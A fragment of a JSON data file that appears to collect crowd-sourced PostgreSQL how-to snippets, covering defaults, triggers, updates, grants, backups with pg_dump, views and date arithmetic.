  },
  {
    "id": 3200,
    "keyword": null,
    "link": null,
    "title": " postgres set default value",
    "description": "ALTER TABLE ONLY users ALTER COLUMN lang SET DEFAULT 'en_GB';\nALTER TABLE users   ADD COLUMN \"priv_user\" BOOLEAN NOT NULL DEFAULT FALSE;\nscore INTEGER DEFAULT 1 /* The variable name is score, and the default value for it is 1 */\n",
    "reg_date": "2021-10-12T09:59:00.000Z"
  },
  {
    "id": 3201,
    "keyword": null,
    "link": null,
    "title": " postgres set sequence value to max id",
    "description": "SELECT setval('table_id_seq', (SELECT MAX(id) FROM table));\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3202,
    "keyword": null,
    "link": null,
    "title": " postgres show databases",
    "description": "SELECT current_database();\n# List databases: \\l\npostgres=# \\l\nList all databases: \\l\npostgres=# \\l \n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3203,
    "keyword": null,
    "link": null,
    "title": " postgres start database on linux",
    "description": "sudo service postgresql start\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3204,
    "keyword": null,
    "link": null,
    "title": " postgres switch between databases",
    "description": "\\c DBNAME\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3205,
    "keyword": null,
    "link": null,
    "title": " postgres timestamp to datetime",
    "description": "to_timestamp(field_name)::timestamp\nselect now() - INTERVAL '1 YEAR';\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3206,
    "keyword": null,
    "link": null,
    "title": " postgres trigger insert into another table",
    "description": " -- Trigger to update donatiom count in donor table whenever -- A new donation is made by that person  CREATE or REPLACE FUNCTION increase_count() RETURNS TRIGGER AS $$ BEGIN \tUPDATE donor SET dcount = dcount + 1 WHERE did = NEW.did; END $$ LANGUAGE plpgsql;    CREATE TRIGGER update_donation_count AFTER INSERT ON donation FOR EACH ROW EXECUTE PROCEDURE increase_count(); \nCREATE OR REPLACE FUNCTION function_copy() RETURNS TRIGGER AS $BODY$ BEGIN     INSERT INTO         table2(id,name)         VALUES(new.id,new.name);             RETURN new; END; $BODY$ language plpgsql;\nCREATE TRIGGER trig_copy      AFTER INSERT ON table1      FOR EACH ROW      EXECUTE PROCEDURE function_copy();\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3207,
    "keyword": null,
    "link": null,
    "title": " postgres update column with value from another table",
    "description": "UPDATE t1  set \"Column\" = t2.column from t2  where t2.id = t1.\"Id\";\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3208,
    "keyword": null,
    "link": null,
    "title": " postgres update multiple columns",
    "description": "UPDATE table SET column1 = value1,     column2 = value2 ,... WHERE \tcondition;\nUPDATE table_name  SET column_one = TRUE,     column_two = 'some string',     column_three = 558, WHERE column_four = 'some other string'\n                                     ALTER TABLE customer  ADD COLUMN fax VARCHAR, ADD COLUMN email VARCHAR;\nUPDATE table_name SET column1 = value1,     column2 = value2,     ... WHERE condition;\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3209,
    "keyword": null,
    "link": null,
    "title": " postgres update with if condition query",
    "description": "update t1         set t1.current_location =            CASE   \t\t\tWHEN SUBQUERY.status = 0 THEN 'Deployed'  \t\t\tWHEN SUBQUERY.status = 1 THEN 'Retrieved'  \t\t\tWHEN SUBQUERY.status = 2 THEN 'Lost'              ELSE t1.current_location \t\tEND  from (     select t3.serial_number, t2.status     from t2 inner join t3         on t2.some_id = t3.some_id     ) as SUBQUERY  where SUBQUERY.serial_number = t1.serial_number;\nupdate t1    set current_location =      case t2.status         when 0 then 'Deployed'         when 1 then 'Retrieved'         when 2 then 'Lost'     end from t2 inner join t3    on t2.some_id = t3.some_id where t3.serial_number = t1.serial_number;\n",
    "reg_date": "2021-10-12T09:59:01.000Z"
  },
  {
    "id": 3210,
    "keyword": null,
    "link": null,
    "title": " postgres updatet at field",
    "description": "CREATE OR REPLACE FUNCTION public.set_current_timestamp_updated_at()  RETURNS trigger  LANGUAGE plpgsql AS $function$ DECLARE   _new record; BEGIN   _new := NEW;   _new.\"updated_at\" = NOW();   RETURN _new; END; $function$   CREATE TRIGGER set_updated_at BEFORE UPDATE ON your_table FOR EACH ROW EXECUTE FUNCTION set_current_timestamp_updated_at(); \n-- Step 1: Create the function CREATE OR REPLACE FUNCTION trigger_set_timestamp() RETURNS TRIGGER AS $$ BEGIN   NEW.updated_at = NOW();   RETURN NEW; END; $$ LANGUAGE plpgsql;  -- Step 2: Create the table CREATE TABLE my_table (   id SERIAL NOT NULL PRIMARY KEY,   content TEXT,   created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),   updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW() );  -- Step 3: Create the trigger CREATE TRIGGER set_timestamp BEFORE UPDATE ON my_table FOR EACH ROW EXECUTE PROCEDURE trigger_set_timestamp();  -- Step 4: Profit -- Now we can insert and update rows in the table, and both  -- the created_at and updated_at columns will be saved correctly :)\n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3211,
    "keyword": null,
    "link": null,
    "title": " postgresql Insufficient privilege: 7 ERROR: permission denied for table",
    "description": " # One Table  GRANT ALL PRIVILEGES ON TABLE side_adzone TO jerry;    # All Tables of schema  GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO jerry;\n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3212,
    "keyword": null,
    "link": null,
    "title": " postgresql add column with constraint",
    "description": "ALTER TABLE customers  ADD COLUMN contact_name VARCHAR NOT NULL; \n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3213,
    "keyword": null,
    "link": null,
    "title": " postgresql add entry to table",
    "description": "INSERT INTO table_name(column1, column2, &hellip;) VALUES (value1, value2, &hellip;);\nINSERT INTO films    (code, title, did, date_prod, kind)     VALUES    ('T_601', 'Yojimbo', 106, '1961-06-16', 'Drama');\n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3214,
    "keyword": null,
    "link": null,
    "title": " postgresql add enum value",
    "description": "ALTER TYPE enum_type ADD VALUE 'new_value'; -- appends to list ALTER TYPE enum_type ADD VALUE 'new_value' BEFORE 'old_value'; ALTER TYPE enum_type ADD VALUE 'new_value' AFTER 'old_value';\n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3215,
    "keyword": null,
    "link": null,
    "title": " postgresql add leading zeros",
    "description": "SELECT lpad(42::text, 4, '0')\n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3216,
    "keyword": null,
    "link": null,
    "title": " postgresql add not null constraint",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name SET NOT NULL;\nalter table users alter column email set not null; \n-- To change a column to NOT NULL: ALTER TABLE products ALTER COLUMN product_no SET NOT NULL;\n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3217,
    "keyword": null,
    "link": null,
    "title": " postgresql alter column nullable",
    "description": "-- To change a column to NOT NULL: ALTER TABLE products ALTER COLUMN product_no SET NOT NULL;\n-- To change a column to nullable ALTER TABLE mytable ALTER COLUMN mycolumn DROP NOT NULL;\n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3218,
    "keyword": null,
    "link": null,
    "title": " postgresql alter table add boolean column",
    "description": "ALTER TABLE users   ADD COLUMN \"priv_user\" BOOLEAN NOT NULL DEFAULT FALSE; \n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3219,
    "keyword": null,
    "link": null,
    "title": " postgresql alter table sequence",
    "description": "alter sequence your_sequence restart with 1000; \n",
    "reg_date": "2021-10-12T09:59:02.000Z"
  },
  {
    "id": 3220,
    "keyword": null,
    "link": null,
    "title": " postgresql append array",
    "description": "array_append(anyarray, anyelement);\n",
    "reg_date": "2021-10-12T09:59:03.000Z"
  },
  {
    "id": 3221,
    "keyword": null,
    "link": null,
    "title": " postgresql auto increment",
    "description": "ALTER SEQUENCE product_id_seq RESTART WITH 1453\nCREATE TABLE table_name(     id SERIAL );Code language: SQL (Structured Query Language) (sql)\nCREATE SEQUENCE cateogry_id_seq; ALTER TABLE category ALTER COLUMN category_id SET DEFAULT nextval('cateogry_id_seq'); \n",
    "reg_date": "2021-10-12T09:59:03.000Z"
  },
  {
    "id": 3222,
    "keyword": null,
    "link": null,
    "title": " postgresql backup and restore globals and data",
    "description": "$ pg_dump -U postgres -h localhost -p 5433 --clean --file=sandbox.sql sandbox $ pg_dumpall -U postgres -h localhost -p 5433 --clean --globals-only --file=globals.sql\n$ psql -U postgres -h localhost -p 5433 < globals.sql $ psql -U postgres -h localhost -p 5433 < sandbox.sql\n",
    "reg_date": "2021-10-12T09:59:03.000Z"
  },
  {
    "id": 3223,
    "keyword": null,
    "link": null,
    "title": " postgresql blocked on mac",
    "description": "$ brew services stop postgresql $ rm /usr/local/var/postgres/postmaster.pid # adjust path accordingly to your install $ brew services start postgresql \n",
    "reg_date": "2021-10-12T09:59:03.000Z"
  },
  {
    "id": 3224,
    "keyword": null,
    "link": null,
    "title": " postgresql cast",
    "description": "SELECT '100'::INTEGER; SELECT CAST ('100' AS INTEGER);\n",
    "reg_date": "2021-10-12T09:59:03.000Z"
  },
  {
    "id": 3225,
    "keyword": null,
    "link": null,
    "title": " postgresql certain first 4 characters in string",
    "description": "SELECT employee_id,first_name, substring(first_name,1,4) FROM employees;\n",
    "reg_date": "2021-10-12T09:59:03.000Z"
  },
  {
    "id": 3226,
    "keyword": null,
    "link": null,
    "title": " postgresql change column to not null",
    "description": "ALTER TABLE table_name ALTER COLUMN column_name SET NOT NULL;\n-- To change a column to NOT NULL: ALTER TABLE products ALTER COLUMN product_no SET NOT NULL;\n",
    "reg_date": "2021-10-12T09:59:03.000Z"
  },
  {
    "id": 3227,
    "keyword": null,
    "link": null,
    "title": " postgresql change column type",
    "description": "                                     ALTER TABLE assets ALTER COLUMN name TYPE VARCHAR; \nALTER TABLE table_name ALTER COLUMN column_name [SET DATA] TYPE new_data_type;\nALTER TABLE table_name ALTER COLUMN column_name [SET DATA] TYPE new_data_type;   \n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3228,
    "keyword": null,
    "link": null,
    "title": " postgresql change default value",
    "description": "ALTER TABLE ONLY users ALTER COLUMN lang SET DEFAULT 'en_GB';\n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3229,
    "keyword": null,
    "link": null,
    "title": " postgresql change row values",
    "description": "UPDATE schema.table_name SET column1 = 'value1'   , column2 = 'value2'   , ... WHERE column3 = 'criteria'\n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3230,
    "keyword": null,
    "link": null,
    "title": " postgresql change user role grant",
    "description": "=# ALTER USER librarian WITH SUPERUSER; ALTER ROLE \n=# ALTER USER role_specification WITH OPTION1 OPTION2 OPTION3; \n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3231,
    "keyword": null,
    "link": null,
    "title": " postgresql combine values in one field",
    "description": "SELECT movie, string_agg(actor, ', ') AS actor_list FROM   tbl GROUP  BY 1;\n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3232,
    "keyword": null,
    "link": null,
    "title": " postgresql concat string with separator",
    "description": "SELECT \tconcat_ws (', ', last_name, first_name) AS full_name FROM \tcustomer ORDER BY \tlast_name;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3233,
    "keyword": null,
    "link": null,
    "title": " postgresql connect to database command line",
    "description": "user@user-pc:~$ sudo -i -u postgres postgres@user-pc:~$ psql psql (9.3.5, server 9.3.6) Type \"help\" for help. \nFor Windows users using the SQL shell  \\c DB_NAME USER_NAME HOST PORT  // to get the connection details such as your username, host and port simply use the \"\\conninfo\" command  eg : \\c test1 john_doe localhost 5432\n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3234,
    "keyword": null,
    "link": null,
    "title": " postgresql contains",
    "description": "SELECT id FROM TAG_TABLE WHERE 'aaaaaaaa' LIKE '%' || tag_name || '%';\n",
    "reg_date": "2021-10-12T09:59:04.000Z"
  },
  {
    "id": 3235,
    "keyword": null,
    "link": null,
    "title": " postgresql convert text to float",
    "description": "select cast('132342' as double precision);\n",
    "reg_date": "2021-10-12T09:59:05.000Z"
  },
  {
    "id": 3236,
    "keyword": null,
    "link": null,
    "title": " postgresql create query",
    "description": "CREATE TABLE COMPANY(    ID INT PRIMARY KEY     NOT NULL,    NAME           TEXT    NOT NULL,    AGE            INT     NOT NULL,    ADDRESS        CHAR(50),    SALARY         REAL,    JOIN_DATE\t  DATE );  INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,SALARY,JOIN_DATE) VALUES (1, 'Paul', 32, 'California', 20000.00,'2001-07-13'); INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,JOIN_DATE) VALUES (2, 'Allen', 25, 'Texas', '2007-12-13'); INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,SALARY,JOIN_DATE) VALUES (3, 'Teddy', 23, 'Norway', 20000.00, DEFAULT ); INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,SALARY,JOIN_DATE) VALUES (4, 'Mark', 25, 'Rich-Mond ', 65000.00, '2007-12-13' ), (5, 'David', 27, 'Texas', 85000.00, '2007-12-13');\n",
    "reg_date": "2021-10-12T09:59:05.000Z"
  },
  {
    "id": 3237,
    "keyword": null,
    "link": null,
    "title": " postgresql create role",
    "description": "CREATE ROLE role_name;\nCREATE ROLE joe LOGIN INHERIT; CREATE ROLE admin NOINHERIT; CREATE ROLE wheel NOINHERIT; GRANT admin TO joe; GRANT wheel TO admin; \nCREATE ROLE role_name with NOSUPERUSER NOINHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION NOBYPASSRLS;\nCREATE ROLE name [ WITH ADMIN role_name ] \n",
    "reg_date": "2021-10-12T09:59:05.000Z"
  },
  {
    "id": 3238,
    "keyword": null,
    "link": null,
    "title": " postgresql create schema in specific database",
    "description": " CREATE DATABASE foo;  \\connect foo;  CREATE SCHEMA yourschema; \n",
    "reg_date": "2021-10-12T09:59:05.000Z"
  },
  {
    "id": 3239,
    "keyword": null,
    "link": null,
    "title": " postgresql create table as select",
    "description": "CREATE TABLE films_recent AS   SELECT * FROM films WHERE date_prod >= '2002-01-01'; \n",
    "reg_date": "2021-10-12T09:59:05.000Z"
  },
  {
    "id": 3240,
    "keyword": null,
    "link": null,
    "title": " postgresql create table with boolean column",
    "description": "CREATE TABLE stock_availability (    product_id INT PRIMARY KEY,    available BOOLEAN NOT NULL );\n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3241,
    "keyword": null,
    "link": null,
    "title": " postgresql create table with index",
    "description": "CREATE INDEX index_name ON table_name (column_name); \n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3242,
    "keyword": null,
    "link": null,
    "title": " postgresql create trigger update timestamp",
    "description": "CREATE OR REPLACE FUNCTION public.set_current_timestamp_updated_at()  RETURNS trigger  LANGUAGE plpgsql AS $function$ DECLARE   _new record; BEGIN   _new := NEW;   _new.\"updated_at\" = NOW();   RETURN _new; END; $function$   CREATE TRIGGER set_updated_at BEFORE UPDATE ON your_table FOR EACH ROW EXECUTE FUNCTION set_current_timestamp_updated_at(); \n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3243,
    "keyword": null,
    "link": null,
    "title": " postgresql crete view",
    "description": "                                     CREATE VIEW customer_master AS   SELECT cu.customer_id AS id,     cu.first_name || ' ' || cu.last_name AS name,     a.address,     a.postal_code AS \"zip code\",     a.phone,     city.city,     country.country,         CASE             WHEN cu.activebool THEN 'active'             ELSE ''         END AS notes,     cu.store_id AS sid    FROM customer cu      INNER JOIN address a USING (address_id)      INNER JOIN city USING (city_id)      INNER JOIN country USING (country_id);\nCREATE VIEW custom_view AS \t(SELECT ...)\n                                     CREATE OR REPLACE view_name  AS  query\n                                     CREATE VIEW customer_master AS   SELECT cu.customer_id AS id,     cu.first_name || ' ' || cu.last_name AS name,     a.address,     a.postal_code AS \"zip code\",     a.phone,     city.city,     country.country,         CASE             WHEN cu.activebool THEN 'active'             ELSE ''         END AS notes,     cu.store_id AS sid,     cu.email    FROM customer cu      INNER JOIN address a USING (address_id)      INNER JOIN city USING (city_id)      INNER JOIN country USING (country_id);\nCREATE [ OR REPLACE ] [ TEMP | TEMPORARY ] VIEW name [ ( column_name [, ...] ) ]     [ WITH ( view_option_name [= view_option_value] [, ... ] ) ]     AS query \n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3244,
    "keyword": null,
    "link": null,
    "title": " postgresql database url",
    "description": "DATABASE_URL = \"postgres://YourUserName:YourPassword@localHost:5432/YourDatabaseName\"; \nPG_URI=postgres://postgres:root@localhost:5432/campus\n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3245,
    "keyword": null,
    "link": null,
    "title": " postgresql date at timezone",
    "description": "SET TIME ZONE 'Europe/Moscow';\nselect updatedat AT TIME ZONE 'UTC';\n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3246,
    "keyword": null,
    "link": null,
    "title": " postgresql datetrunc too slow",
    "description": "CREATE INDEX ON test (date_trunc('day', updated_at));  /*If updated_at is a timestamp without time zone, that will work fine.  For a timestamp with time zone, you'll have to specify a time zone,  because otherwise the result will depend on the session time zone,  which makes it unusable for an index:*/  CREATE INDEX ON test (date_trunc('day', updated_at AT TIME ZONE 'UTC'));\n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3247,
    "keyword": null,
    "link": null,
    "title": " postgresql db owner change",
    "description": "                                     ALTER DATABASE target_database OWNER TO new_onwer;\n",
    "reg_date": "2021-10-12T09:59:06.000Z"
  },
  {
    "id": 3248,
    "keyword": null,
    "link": null,
    "title": " postgresql default value boolean",
    "description": "ALTER TABLE users   ADD COLUMN \"priv_user\" BOOLEAN NOT NULL DEFAULT FALSE;\n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3249,
    "keyword": null,
    "link": null,
    "title": " postgresql define pk sequence next number",
    "description": "ALTER SEQUENCE serial RESTART WITH 105;\n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3250,
    "keyword": null,
    "link": null,
    "title": " postgresql delete cascade",
    "description": "CREATE TABLE employee(emp_id SERIAL PRIMARY  KEY, name VARCHAR(30), \tsector_fk INT NOT NULL);  CREATE TABLE process(emp_id SERIAL PRIMARY KEY, sector VARCHAR(20));  ALTER TABLE employee ADD FOREIGN KEY (sector_fk) REFERENCES company(emp_id) ON DELETE CASCADE;  -- Deletes cascade employees referencing deleted companies DELETE FROM company WHERE sector='industry';\n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3251,
    "keyword": null,
    "link": null,
    "title": " postgresql delete limit",
    "description": "DELETE FROM logtable WHERE ctid IN (     SELECT ctid     FROM logtable     ORDER BY timestamp     LIMIT 10 ) \n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3252,
    "keyword": null,
    "link": null,
    "title": " postgresql delete type",
    "description": "DROP TYPE type_name;\n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3253,
    "keyword": null,
    "link": null,
    "title": " postgresql difference between two dates in days",
    "description": "SELECT   AGE('2012-03-05', '2010-04-01'),   DATE_PART('year', AGE('2012-03-05', '2010-04-01')) AS years,   DATE_PART('month', AGE('2012-03-05', '2010-04-01')) AS months,   DATE_PART('day', AGE('2012-03-05', '2010-04-01')) AS days;   ...   -- This will give you full years, month, days ... between two dates:  --          age          | years | months | days -- -----------------------+-------+--------+------ --  1 year 11 mons 4 days |     1 |     11 |    4\nselect EXTRACT( \tEPOCH FROM now() - (now() - INTERVAL '5 HOUR') )/3600  -- it will return 5\nselect age('2010-04-01', '2012-03-05'),        date_part('year',age('2010-04-01', '2012-03-05')),        date_part('month',age('2010-04-01', '2012-03-05')),        date_part('day',age('2010-04-01', '2012-03-05'));\n  -- Difference between Dec 30, 2011 08:54:55 and  Dec 30, 2011 08:56:10 in minutes   SELECT (DATE_PART('day', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp) * 24 * 60 +                 DATE_PART('hour', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp)) * 60 +                DATE_PART('minute', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp);   -- Result: 1     -- Time only   SELECT DATE_PART('hour', '08:56:10'::time - '08:54:55'::time) * 60 +               DATE_PART('minute', '08:56:10'::time - '08:54:55'::time);   -- Result: 1\n   CREATE OR REPLACE FUNCTION DateDiff (units VARCHAR(30), start_t TIME, end_t TIME)       RETURNS INT AS $$    DECLARE      diff_interval INTERVAL;       diff INT = 0;    BEGIN      -- Minus operator for TIME returns interval 'HH:MI:SS'        diff_interval = end_t - start_t;        diff = DATE_PART('hour', diff_interval);        IF units IN ('hh', 'hour') THEN        RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('minute', diff_interval);        IF units IN ('mi', 'n', 'minute') THEN         RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('second', diff_interval);        RETURN diff;    END;    $$ LANGUAGE plpgsql;\n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3254,
    "keyword": null,
    "link": null,
    "title": " postgresql distinct",
    "description": "SELECT \tDISTINCT bcolor FROM \tdistinct_demo ORDER BY \tbcolor;\nSelect Distinct On (u.username, u.email)      u.username     ,u.email     ,l.browser     ,l.login_time From users u Join logins l On l.username = u.username Order By u.username, u.email, login_time Desc                                           ^ \n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3255,
    "keyword": null,
    "link": null,
    "title": " postgresql drop primary key constraint",
    "description": "alter table public.test1 drop constraint test1_pkey \n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3256,
    "keyword": null,
    "link": null,
    "title": " postgresql drop table",
    "description": "DROP TABLE IF EXISTS tablename;\nDROP TABLE name;\nDROP TABLE [ IF EXISTS ] name [, ...] [ CASCADE | RESTRICT ] \n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3257,
    "keyword": null,
    "link": null,
    "title": " postgresql dump and restore db",
    "description": "psql -U postgres -h localhost -p 5432 -f data_dump.sql\npsql -d database_name -f backup.sql\n#To dump a database called mydb into a SQL-script file: pg_dump mydb > db.sql  #To reload such a script into a (freshly created) database named newdb: psql -d newdb -f db.sql\n",
    "reg_date": "2021-10-12T09:59:07.000Z"
  },
  {
    "id": 3258,
    "keyword": null,
    "link": null,
    "title": " postgresql export database",
    "description": "pg_dump -U username dbname > dbexport.pgsql \n// Command Prompt // it may be needed to update the PATH on cmd pg_dump -U username dbname > filename.pgsql\npg_dump dbname > outfile\npsql databasename < data_base_dump\n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3259,
    "keyword": null,
    "link": null,
    "title": " postgresql export output table as a csv",
    "description": "COPY table_name TO 'file_name.csv' DELIMITER ',' CSV HEADER; \n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3260,
    "keyword": null,
    "link": null,
    "title": " postgresql find biggest table",
    "description": "select schemaname as table_schema,     relname as table_name,     pg_size_pretty(pg_total_relation_size(relid)) as total_size,     pg_size_pretty(pg_relation_size(relid)) as data_size,     pg_size_pretty(pg_total_relation_size(relid) - pg_relation_size(relid))       as external_size from pg_catalog.pg_statio_user_tables order by pg_total_relation_size(relid) desc,          pg_relation_size(relid) desc limit 10; \n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3261,
    "keyword": null,
    "link": null,
    "title": " postgresql format date dd/mm/yyyy",
    "description": "select to_char(date_col, 'DD/MM/YYYY') from table;\n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3262,
    "keyword": null,
    "link": null,
    "title": " postgresql full text search",
    "description": "Full Text Searching (or just text search) provides the capability to  identify natural-language documents that satisfy a query, and optionally to sort them by relevance to the query. The most common type of search is to find all documents containing given query terms and return them in order of their similarity to the query. Notions of query and similarity  are very flexible and depend on the specific application. The simplest search considers query as a set of words and similarity as the frequency of query words in the document. \n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3263,
    "keyword": null,
    "link": null,
    "title": " postgresql function sum(text) does not exist",
    "description": "make sure the column refered is a number (probably is a text type)\n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3264,
    "keyword": null,
    "link": null,
    "title": " postgresql get current user name",
    "description": "SELECT CURRENT_USER;\n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3265,
    "keyword": null,
    "link": null,
    "title": " postgresql get date from datetime",
    "description": "SELECT DATE(column_name) FROM table_name;\n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3266,
    "keyword": null,
    "link": null,
    "title": " postgresql get difference between two dates",
    "description": "select EXTRACT( \tEPOCH FROM now() - (now() - INTERVAL '5 HOUR') )/3600  -- it will return 5\nselect age('2010-04-01', '2012-03-05'),        date_part('year',age('2010-04-01', '2012-03-05')),        date_part('month',age('2010-04-01', '2012-03-05')),        date_part('day',age('2010-04-01', '2012-03-05'));\n  -- Difference between Dec 30, 2011 08:54:55 and  Dec 30, 2011 08:56:10 in minutes   SELECT (DATE_PART('day', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp) * 24 * 60 +                 DATE_PART('hour', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp)) * 60 +                DATE_PART('minute', '2011-12-30 08:56:10'::timestamp - '2011-12-30 08:54:55'::timestamp);   -- Result: 1     -- Time only   SELECT DATE_PART('hour', '08:56:10'::time - '08:54:55'::time) * 60 +               DATE_PART('minute', '08:56:10'::time - '08:54:55'::time);   -- Result: 1\n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3267,
    "keyword": null,
    "link": null,
    "title": " postgresql get difference in hours between two dates",
    "description": "select EXTRACT( \tEPOCH FROM now() - (now() - INTERVAL '5 HOUR') )/3600  -- it will return 5\nselect age('2010-04-01', '2012-03-05'),        date_part('year',age('2010-04-01', '2012-03-05')),        date_part('month',age('2010-04-01', '2012-03-05')),        date_part('day',age('2010-04-01', '2012-03-05'));\n   CREATE OR REPLACE FUNCTION DateDiff (units VARCHAR(30), start_t TIME, end_t TIME)       RETURNS INT AS $$    DECLARE      diff_interval INTERVAL;       diff INT = 0;    BEGIN      -- Minus operator for TIME returns interval 'HH:MI:SS'        diff_interval = end_t - start_t;        diff = DATE_PART('hour', diff_interval);        IF units IN ('hh', 'hour') THEN        RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('minute', diff_interval);        IF units IN ('mi', 'n', 'minute') THEN         RETURN diff;      END IF;        diff = diff * 60 + DATE_PART('second', diff_interval);        RETURN diff;    END;    $$ LANGUAGE plpgsql;\n",
    "reg_date": "2021-10-12T09:59:08.000Z"
  },
  {
    "id": 3268,
    "keyword": null,
    "link": null,
    "title": " postgresql get last 10 records",
    "description": "SELECT * from <table_name> order by \"Date\" DESC LIMIT 10;\nselect last_value(\"name\") over(order by created_at desc) as name from profile\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3269,
    "keyword": null,
    "link": null,
    "title": " postgresql get last day of month",
    "description": "create function end_of_month(date) returns date as $$ select (date_trunc('month', $1) + interval '1 month' - interval '1 day')::date; $$ language 'sql' immutable strict; \nSELECT (date_trunc('month', '2017-01-05'::date) + interval '1 month' - interval '1 day')::date AS end_of_month; \n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3270,
    "keyword": null,
    "link": null,
    "title": " postgresql get table names",
    "description": "SELECT table_name   FROM information_schema.tables  WHERE table_schema='public'    AND table_type='BASE TABLE'; \nSELECT table_name   FROM information_schema.tables  WHERE table_schema='public'    AND table_type='BASE TABLE';\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3271,
    "keyword": null,
    "link": null,
    "title": " postgresql get year",
    "description": "select extract(year from your_column) from your_table;\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3272,
    "keyword": null,
    "link": null,
    "title": " postgresql grant all privileges on database",
    "description": "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA schema_name TO username; \nGRANT ALL PRIVILEGES ON dbname TO username;\nGRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA schema_name TO username; \nALTER DATABASE name OWNER TO new_owner;\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3273,
    "keyword": null,
    "link": null,
    "title": " postgresql grant owner to user",
    "description": "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA schema_name TO username; \nGRANT ALL PRIVILEGES ON dbname TO username;\nGRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA schema_name TO username; \nALTER DATABASE name OWNER TO new_owner;\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3274,
    "keyword": null,
    "link": null,
    "title": " postgresql group by month and year",
    "description": "date_trunc('month', col_date)\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3275,
    "keyword": null,
    "link": null,
